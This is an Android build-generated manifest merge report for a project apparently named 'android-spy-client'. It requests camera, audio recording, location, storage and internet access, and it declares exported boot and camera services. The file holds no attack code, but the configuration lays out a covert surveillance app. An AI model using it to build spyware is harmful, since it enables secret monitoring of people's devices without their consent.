android-spy-client/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.example.service"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="21"
8-->src/main/AndroidManifest.xml
9        android:targetSdkVersion="28" />
9-->src/main/AndroidManifest.xml
10
11    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
11-->src/main/AndroidManifest.xml:5:5-81
11-->src/main/AndroidManifest.xml:5:22-78
12    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
12-->src/main/AndroidManifest.xml:6:5-79
12-->src/main/AndroidManifest.xml:6:22-76
13    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
13-->src/main/AndroidManifest.xml:7:5-80
13-->src/main/AndroidManifest.xml:7:22-77
14    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
14-->src/main/AndroidManifest.xml:8:5-81
14-->src/main/AndroidManifest.xml:8:22-78
15    <uses-permission android:name="android.permission.CAMERA" />
15-->src/main/AndroidManifest.xml:9:5-65
15-->src/main/AndroidManifest.xml:9:22-62
16    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
16-->src/main/AndroidManifest.xml:10:5-81
16-->src/main/AndroidManifest.xml:10:22-78
17    <uses-permission android:name="android.permission.INTERNET" />
17-->src/main/AndroidManifest.xml:11:5-66
17-->src/main/AndroidManifest.xml:11:22-64
18    <uses-permission android:name="android.permission.RECORD_AUDIO" />
18-->src/main/AndroidManifest.xml:12:5-70
18-->src/main/AndroidManifest.xml:12:22-68
19
20    <application
20-->src/main/AndroidManifest.xml:14:5-43:19
21        android:allowBackup="true"
21-->src/main/AndroidManifest.xml:15:9-35
22        android:appComponentFactory="android.support.v4.app.CoreComponentFactory"
22-->[com.android.support:support-compat:28.0.0] AndroidManifest.xml:22:18-91
23        android:debuggable="true"
24        android:icon="@mipmap/ic_launcher"
24-->src/main/AndroidManifest.xml:16:9-43
25        android:label="@string/app_name"
25-->src/main/AndroidManifest.xml:17:9-41
26        android:roundIcon="@mipmap/ic_launcher_round"
26-->src/main/AndroidManifest.xml:18:9-54
27        android:supportsRtl="true"
27-->src/main/AndroidManifest.xml:19:9-35
28        android:testOnly="true"
29        android:theme="@style/AppTheme" >
29-->src/main/AndroidManifest.xml:20:9-40
30        <receiver
30-->src/main/AndroidManifest.xml:21:9-29:20
31            android:name="com.example.service.BootCompletedIntentReceiver"
31-->src/main/AndroidManifest.xml:22:13-56
32            android:enabled="true"
32-->src/main/AndroidManifest.xml:23:13-35
33            android:exported="true" >
33-->src/main/AndroidManifest.xml:24:13-36
34            <intent-filter>
34-->src/main/AndroidManifest.xml:25:13-28:29
35                <action android:name="android.intent.action.BOOT_COMPLETED" />
35-->src/main/AndroidManifest.xml:26:17-79
35-->src/main/AndroidManifest.xml:26:25-76
36                <action android:name="bc" />
36-->src/main/AndroidManifest.xml:27:17-44
36-->src/main/AndroidManifest.xml:27:25-42
37            </intent-filter>
38        </receiver>
39
40        <activity android:name="com.example.service.service" >
40-->src/main/AndroidManifest.xml:31:9-37:20
40-->src/main/AndroidManifest.xml:31:19-42
41            <intent-filter>
41-->src/main/AndroidManifest.xml:32:13-36:29
42                <action android:name="android.intent.action.MAIN" />
42-->src/main/AndroidManifest.xml:33:17-69
42-->src/main/AndroidManifest.xml:33:25-66
43
44                <category android:name="android.intent.category.LAUNCHER" />
44-->src/main/AndroidManifest.xml:35:17-77
44-->src/main/AndroidManifest.xml:35:27-74
45            </intent-filter>
46        </activity>
47
48        <service
48-->src/main/AndroidManifest.xml:39:9-42:39
49            android:name="com.example.service.Camera2Service"
49-->src/main/AndroidManifest.xml:40:13-43
50            android:enabled="true"
50-->src/main/AndroidManifest.xml:41:13-35
51            android:exported="true" />
51-->src/main/AndroidManifest.xml:42:13-36
52    </application>
53
54</manifest>